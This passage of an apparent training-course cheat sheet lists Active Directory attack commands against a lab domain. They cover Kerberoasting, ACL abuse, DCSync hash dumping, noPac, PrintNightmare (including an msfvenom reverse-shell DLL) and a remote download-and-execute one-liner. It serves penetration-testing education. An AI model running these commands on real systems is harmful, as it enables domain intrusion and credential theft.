--groups</code></td><td style=text-align:left>Authenticates with a Windows target over smb using valid credentials and attempts to discover groups (&ndash;groups) in a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users</code></td><td style=text-align:left>Authenticates with a Windows target over smb using valid credentials and attempts to check for a list of logged on users (&ndash;loggedon-users) on the target Windows host. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td><td style=text-align:left>Authenticates with a Windows target over smb using valid credentials and attempts to discover any smb shares (&ndash;shares). Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code></td><td style=text-align:left>Authenticates with a Windows target over smb using valid credentials and utilizes the CrackMapExec module (-M) spider_plus to go through each readable share (Dev-share) and list all readable files. The results are outputted in JSON. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></td><td style=text-align:left>Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (-H). Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code></td><td style=text-align:left>Enumerates the target Windows domain using valid credentials and performs a recursive listing (-R) of the specified share (SYSVOL) and only outputs a list of directories (&ndash;dir-only) in the share. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>rpcclient $> queryuser 0x457</code></td><td style=text-align:left>Enumerates a target user account in a Windows domain using its relative identifier (0x457). Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>rpcclient $> enumdomusers</code></td><td style=text-align:left>Discovers user accounts in a target Windows domain and their associated relative identifiers (rid). Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125</code></td><td style=text-align:left>Impacket tool used to connect to the CLI of a Windows target via the ADMIN$ administrative share with valid credentials. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</code></td><td style=text-align:left>Impacket tool used to connect to the CLI of a Windows target via WMI with valid credentials. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>windapsearch.py -h</code></td><td style=text-align:left>Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da</code></td><td style=text-align:left>Used to enumerate the domain admins group (&ndash;da) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU</code></td><td style=text-align:left>Used to perform a recursive search (-PU) for users with nested permissions using valid credentials. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</code></td><td style=text-align:left>Executes the python implementation of BloodHound (bloodhound.py) with valid credentials and specifies a name server (-ns) and target Windows domain (inlanefreight.local) as well as runs all checks (-c all). Runs using valid credentials. Performed from a Linux-based host.</td></tr></tbody></table><p><strong>Enumeration by Living Off the Land</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>Get-Module</code></td><td style=text-align:left>PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Import-Module ActiveDirectory</code></td><td style=text-align:left>Loads the Active Directory PowerShell module from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-ADDomain</code></td><td style=text-align:left>PowerShell cmd-let used to gather Windows domain information from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</code></td><td style=text-align:left>PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-ADTrust -Filter *</code></td><td style=text-align:left>PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-ADGroup -Filter * | select name</code></td><td style=text-align:left>PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (select name). Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-ADGroup -Identity "Backup Operators"</code></td><td style=text-align:left>PowerShell cmd-let used to search for a specifc group (-Identity &ldquo;Backup Operators&rdquo;). Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-ADGroupMember -Identity "Backup Operators"</code></td><td style=text-align:left>PowerShell cmd-let used to discover the members of a specific group (-Identity &ldquo;Backup Operators&rdquo;). Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Export-PowerViewCSV</code></td><td style=text-align:left>PowerView script used to append results to a CSV file. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>ConvertTo-SID</code></td><td style=text-align:left>PowerView script used to convert a User or Group name to it&rsquo;s SID. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainSPNTicket</code></td><td style=text-align:left>PowerView script used to request the kerberos ticket for a specified service principal name (SPN). Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-Domain</code></td><td style=text-align:left>PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainController</code></td><td style=text-align:left>PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainUser</code></td><td style=text-align:left>PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainComputer</code></td><td style=text-align:left>PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainGroup</code></td><td style=text-align:left>PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainOU</code></td><td style=text-align:left>PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Find-InterestingDomainAcl</code></td><td style=text-align:left>PowerView script used to find object ACLs in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainGroupMember</code></td><td style=text-align:left>PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainFileServer</code></td><td style=text-align:left>PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainDFSShare</code></td><td style=text-align:left>PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainGPO</code></td><td style=text-align:left>PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainPolicy</code></td><td style=text-align:left>PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-NetLocalGroup</code></td><td style=text-align:left>PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-NetLocalGroupMember</code></td><td style=text-align:left>PowerView script enumerate members of a specific local group. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-NetShare</code></td><td style=text-align:left>PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-NetSession</code></td><td style=text-align:left>PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Test-AdminAccess</code></td><td style=text-align:left>PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Find-DomainUserLocation</code></td><td style=text-align:left>PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Find-DomainShare</code></td><td style=text-align:left>PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Find-InterestingDomainShareFile</code></td><td style=text-align:left>PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Find-LocalAdminAccess</code></td><td style=text-align:left>PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainTrust</code></td><td style=text-align:left>PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-ForestTrust</code></td><td style=text-align:left>PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainForeignUser</code></td><td style=text-align:left>PowerView script that enumerates users who are in groups outside of the user&rsquo;s domain. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainForeignGroupMember</code></td><td style=text-align:left>PowerView script that enumerates groups with users outside of the group&rsquo;s domain and returns each foreign member. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainTrustMapping</code></td><td style=text-align:left>PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainGroupMember -Identity "Domain Admins" -Recurse</code></td><td style=text-align:left>PowerView script used to list all the members of a target group (&ldquo;Domain Admins&rdquo;) through the use of the recurse option (-Recurse). Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></td><td style=text-align:left>PowerView script used to find users on the target Windows domain that have the Service Principal Name set. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data</code></td><td style=text-align:left>Runs a tool called Snaffler against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.</td></tr></tbody></table><p><strong>Transfering Files</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>sudo python3 -m http.server 8001</code></td><td style=text-align:left>Starts a python web server for quick hosting of files. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"</code></td><td style=text-align:left>PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code></td><td style=text-align:left>Starts a impacket SMB server for quick hosting of a file. Performed from a Windows-based host.</td></tr></tbody></table><p><strong>Kerberoasting</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>sudo python3 -m pip install .</code></td><td style=text-align:left>Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>GetUserSPNs.py -h</code></td><td style=text-align:left>Impacket tool used to display the options and functionality of GetUserSPNs.py from a Linux-based host.</td></tr><tr><td style=text-align:left><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code></td><td style=text-align:left>Impacket tool used to get a list of SPNs on the target Windows domain from a Linux-based host.</td></tr><tr><td style=text-align:left><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code></td><td style=text-align:left>Impacket tool used to download/request (-request) all TGS tickets for offline processing from a Linux-based host.</td></tr><tr><td style=text-align:left><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code></td><td style=text-align:left>Impacket tool used to download/request (-request-user) a TGS ticket for a specific user account (sqldev) from a Linux-based host.</td></tr><tr><td style=text-align:left><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code></td><td style=text-align:left>Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.</td></tr><tr><td style=text-align:left><code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code></td><td style=text-align:left>Attempts to crack the Kerberos (-m 13100) ticket hash (sqldev_tgs) using hashcat and a wordlist (rockyou.txt) from a Linux-based host.</td></tr><tr><td style=text-align:left><code>setspn.exe -Q */*</code></td><td style=text-align:left>Used to enumerate SPNs in a target Windows domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"</code></td><td style=text-align:left>PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.</td></tr><tr><td style=text-align:left><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q \*/\* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $\_.Context.PostContext[0].Trim() }</code></td><td style=text-align:left>Used to download/request all TGS tickets from a WIndows-based host.</td></tr><tr><td style=text-align:left><code>mimikatz # base64 /out:true</code></td><td style=text-align:left>Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.</td></tr><tr><td style=text-align:left><code>kerberos::list /export</code></td><td style=text-align:left>Mimikatz command used to extract the TGS tickets from a Windows-based host.</td></tr><tr><td style=text-align:left><code>echo "&lt;base64 blob>" | tr -d \\n</code></td><td style=text-align:left>Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.</td></tr><tr><td style=text-align:left><code>cat encoded_file | base64 -d > sqldev.kirbi</code></td><td style=text-align:left>Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.</td></tr><tr><td style=text-align:left><code>python2.7 kirbi2john.py sqldev.kirbi</code></td><td style=text-align:left>Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat</code></td><td style=text-align:left>Used to modify the crack_file for Hashcat from a Linux-based host.</td></tr><tr><td style=text-align:left><code>cat sqldev_tgs_hashcat</code></td><td style=text-align:left>Used to view the prepared hash from a Linux-based host.</td></tr><tr><td style=text-align:left><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code></td><td style=text-align:left>Used to crack the prepared Kerberos ticket hash (sqldev_tgs_hashcat) using a wordlist (rockyou.txt) from a Linux-based host.</td></tr><tr><td style=text-align:left><code>Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname</code></td><td style=text-align:left>Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></td><td style=text-align:left>PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></td><td style=text-align:left>Exports all TGS tickets to a .CSV file (ilfreight_tgs.csv) from a Windows-based host.</td></tr><tr><td style=text-align:left><code>cat .\ilfreight_tgs.csv</code></td><td style=text-align:left>Used to view the contents of the .csv file from a Windows-based host.</td></tr><tr><td style=text-align:left><code>.\Rubeus.exe</code></td><td style=text-align:left>Used to view the options and functionality possible with the tool Rubeus. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>.\Rubeus.exe kerberoast /stats</code></td><td style=text-align:left>Used to check the kerberoast stats (/stats) within the target Windows domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></td><td style=text-align:left>Used to request/download TGS tickets for accounts with the admin count set to 1 then formats the output in an easy to view & crack manner (/nowrap) . Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>.\Rubeus.exe kerberoast /user:testspn /nowrap</code></td><td style=text-align:left>Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></td><td style=text-align:left>PowerView tool used to check the msDS-SupportedEncryptionType attribute associated with a specific user account (testspn). Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code></td><td style=text-align:left>Used to attempt to crack the ticket hash using a wordlist (rockyou.txt) from a Linux-based host .</td></tr></tbody></table><p><strong>ACL Enumeration & Tactics</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>Find-InterestingDomainAcl</code></td><td style=text-align:left>PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built-in objects from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley</code></td><td style=text-align:left>Used to import PowerView and retrieve the SID of a specific user account (wley) from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}</code></td><td style=text-align:left>Finds all Windows domain objects that the user has rights over by mapping the user&rsquo;s SID to the SecurityIdentifier property from a Windows-based host.</td></tr><tr><td style=text-align:left><code>$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl</code></td><td style=text-align:left>Performs a reverse search & maps to a GUID value from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}</code></td><td style=text-align:left>Discovers a domain object&rsquo;s ACL by performing a search based on GUIDs (-ResolveGUIDs) from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt</code></td><td style=text-align:left>Discovers a group of user accounts in a target Windows domain and adds the output to a text file (ad_users.txt) from a Windows-based host.</td></tr><tr><td style=text-align:left><code>foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}</code></td><td style=text-align:left>Retrieves ACL information for each domain user in a target Windows domain by feeding each list of a text file (ad_users.txt) to the Get-ADUser cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)</code></td><td style=text-align:left>Creates a PSCredential Object from a Windows-based host.</td></tr><tr><td style=text-align:left><code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code></td><td style=text-align:left>Creates a SecureString Object from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></td><td style=text-align:left>PowerView tool used to change the password of a specific user (damundsen) on a target Windows domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members</code></td><td style=text-align:left>PowerView tool used to view the members of a target security group (Help Desk Level 1) from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code></td><td style=text-align:left>PowerView tool used to add a specific user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName</code></td><td style=text-align:left>PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code></td><td style=text-align:left>PowerView tool used to create a fake Service Principal Name given a specific user (adunn) from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></td><td style=text-align:left>PowerView tool used to remove the fake Service Principal Name created during the attack from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose</code></td><td style=text-align:left>PowerView tool used to remove a specific user (damundsen) from a specific security group (Help Desk Level 1) from a Windows-based host.</td></tr><tr><td style=text-align:left><code>ConvertFrom-SddlString</code></td><td style=text-align:left>PowerShell cmdlet used to convert an SDDL string into a readable format. Performed from a Windows-based host.</td></tr></tbody></table><p><strong>DCSync</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th><th style=text-align:left></th><th style=text-align:left></th></tr></thead><tbody><tr><td style=text-align:left>`Get-DomainUser -Identity adunn</td><td style=text-align:left>select samaccountname,objectsid,memberof,useraccountcontrol</td><td style=text-align:left>fl`</td><td style=text-align:left>PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.</td></tr><tr><td style=text-align:left><code>$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</code></td><td style=text-align:left>Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool Get-ObjectAcl to check a specific user&rsquo;s replication rights. Performed from a Windows-based host.</td><td style=text-align:left></td><td style=text-align:left></td></tr><tr><td style=text-align:left><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</code></td><td style=text-align:left>Impacket tool used to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (172.16.5.5) and save the extracted hashes to a file (inlanefreight_hashes). Performed from a Linux-based host.</td><td style=text-align:left></td><td style=text-align:left></td></tr><tr><td style=text-align:left><code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</code></td><td style=text-align:left>Uses Mimikatz to perform a DCSync attack from a Windows-based host.</td><td style=text-align:left></td><td style=text-align:left></td></tr></tbody></table><p><strong>Privileged Access</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"</code></td><td style=text-align:left>PowerView tool to enumerate Remote Desktop Users group on a Windows target from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"</code></td><td style=text-align:left>PowerView tool to enumerate Remote Management Users group on a Windows target from a Windows-based host.</td></tr><tr><td style=text-align:left><code>$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force</code></td><td style=text-align:left>Creates a variable with a plaintext password for a user on a Windows-based host.</td></tr><tr><td style=text-align:left><code>$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)</code></td><td style=text-align:left>Creates a PSCredential object with a username and password for a target domain account from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code></td><td style=text-align:left>Establishes a PowerShell session with a target over the network using specified credentials from a Windows-based host.</td></tr><tr><td style=text-align:left><code>evil-winrm -i 10.129.201.234 -u forend</code></td><td style=text-align:left>Establishes a PowerShell session with a Windows target from a Linux-based host using WinRM.</td></tr><tr><td style=text-align:left><code>Import-Module .\PowerUpSQL.ps1</code></td><td style=text-align:left>Imports the PowerUpSQL tool from a Windows-based host.</td></tr><tr><td style=text-align:left><code>Get-SQLInstanceDomain</code></td><td style=text-align:left>Enumerates SQL server instances from a Windows-based host using PowerUpSQL.</td></tr><tr><td style=text-align:left><code>Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'</code></td><td style=text-align:left>Connects to a SQL server and queries the version from a Windows-based host using PowerUpSQL.</td></tr><tr><td style=text-align:left><code>mssqlclient.py</code></td><td style=text-align:left>Displays functionality and options provided with mssqlclient.py from a Linux-based host.</td></tr><tr><td style=text-align:left><code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code></td><td style=text-align:left>Connects to a MSSQL server from a Linux-based host using Impacket.</td></tr><tr><td style=text-align:left><code>SQL> help</code></td><td style=text-align:left>Displays mssqlclient.py options once connected to a MSSQL server.</td></tr><tr><td style=text-align:left><code>SQL> enable_xp_cmdshell</code></td><td style=text-align:left>Enables xp_cmdshell stored procedure for executing OS commands via the database from a Linux-based host.</td></tr><tr><td style=text-align:left><code>xp_cmdshell whoami /priv</code></td><td style=text-align:left>Enumerates rights on a system using xp_cmdshell.</td></tr></tbody></table><p><strong>NoPac</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>sudo git clone https://github.com/Ridter/noPac.git</code></td><td style=text-align:left>Clones the noPac exploit repository using git from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code></td><td style=text-align:left>Runs scanner.py to check if a target system is vulnerable to noPac/Sam_The_Admin from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></td><td style=text-align:left>Exploits the noPac/Sam_The_Admin vulnerability to gain a SYSTEM shell from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></td><td style=text-align:left>Exploits the noPac/Sam_The_Admin vulnerability to perform a DCSync attack against the built-in Administrator account on a Domain Controller from a Linux-based host.</td></tr></tbody></table><p><strong>PrintNightmare</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code></td><td style=text-align:left>Clone PrintNightmare exploit repository using git from a Linux-based host.</td></tr><tr><td style=text-align:left><code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code></td><td style=text-align:left>Ensure the exploit author&rsquo;s (cube0x0) version of Impacket is installed and uninstall any previous Impacket version on a Linux-based host.</td></tr><tr><td style=text-align:left><code>rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'</code></td><td style=text-align:left>Check if a Windows target has MS-RPRN & MS-PAR exposed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll</code></td><td style=text-align:left>Generate a DLL payload for gaining a shell session from a Windows-based host.</td></tr><tr><td style=text-align:left><code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code></td><td style=text-align:left>Create an SMB server and host a shared folder (CompData) with the DLL payload from a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo python3 CVE-2021-1675.py inlanefreight.local/&lt;username>:&lt;password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'</code></td><td style=text-align:left>Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.</td></tr></tbody></table><p><strong>PetitPotam</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></td><td style=text-align:left>Use Impacket tool to create an NTLM relay, specifying the web enrollment URL for the Certificate Authority host. Performed from a Linux-based host.</td></tr><tr><td style=text-align:left><code>git clone https://github.com/topotam/PetitPotam.git</code></td><td style=text-align:left>Clone the PetitPotam exploit repository using git from a Linux-based 